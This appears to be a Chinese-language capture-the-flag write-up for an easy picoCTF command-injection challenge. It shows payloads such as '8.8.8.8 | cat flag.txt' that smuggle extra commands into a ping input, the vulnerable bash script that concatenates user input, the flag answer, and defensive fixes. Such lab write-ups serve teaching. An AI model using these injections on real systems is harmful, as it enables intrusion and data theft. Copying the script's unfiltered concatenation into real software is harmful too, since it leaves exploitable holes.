# ping-cmd — General Skills (Easy) | picoCTF 2026

> 命令注入：利用过滤的漏洞夹带私货。

## 题目描述

Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input? You can connect to the service here `nc xebec.cylabacademy.net 45750`

**翻译**：让服务器泄露秘密。它本来只能 ping Google DNS（8.8.8.8），但如果对输入动点手脚会怎样？

## 分析

题目声称「tight security because we only allow 8.8.8.8」，听起来像有过滤。但这类题目的常见套路是：服务器把用户的输入直接拼进一条系统命令里执行（类似 `ping -c2 <输入>`）。只要过滤不严，就能利用 shell 的特殊符号（`;`、`|`、`&&`）在命令后面接上自己想执行的命令。

## 解题过程

### 1. 连接服务

```bash
nc xebec.cylabacademy.net 32424
```

（实例重启后地址会变，以题目页面为准）

提示：

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

### 2. 测试正常输入

输入 `8.8.8.8`，可以正常 ping，说明服务本身工作正常。

### 3. 尝试命令注入

输入：

```
8.8.8.8 | ls
```

输出：

```
flag.txt
script.sh
```

`ls` 在服务器上执行了！说明 `|` 没有被过滤，注入成功，目录里有个 `flag.txt`。

### 4. 查看服务器源码

输入：

```
8.8.8.8 | cat script.sh
```

得到我见到的第一段源码：

```bash
#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"
```

问题在最后一行：用户输入 `$domain` 被**直接拼接**进 `bash -c` 的命令字符串里执行，没有任何过滤。所谓「tight security」根本不存在。

### 5. 读取 flag

输入：

```
8.8.8.8 | cat flag.txt
```

得到 flag：`academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_7c0b936f}`

## 漏洞原理

命令注入（Command Injection）：程序把用户输入直接拼进系统命令执行，没有校验过滤。输入 `8.8.8.8 | ls` 后，服务器实际执行：

```
ping -c2 8.8.8.8 | ls
```

shell 把 `|` 解释为管道符号，于是 `ls` 被当作第二条命令执行。攻击者可以借此执行任意命令。

## 防御方法

1. **校验输入格式**：只允许符合 IP 格式的输入（如正则 `^\d{1,3}(\.\d{1,3}){3}$`），拒绝含特殊符号的输入。
2. **不用 shell 拼接字符串**：改用参数列表方式执行（如 Python 的 `subprocess.run(["ping", "-c2", ip])`），输入就不会被解释成命令。

## Flag

`academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_7c0b936f}`

## 总结

不要看他说了什么，要看他做了什么，要亲手验证漏洞的存在与否

---

### 踩坑记录

一开始我把 `8.8.8.8 | ls` 输进了**自己的终端**而不是 nc 连接里，结果 `ls` 的是自己电脑。攻击 payload 要发给目标，不是发给自己。
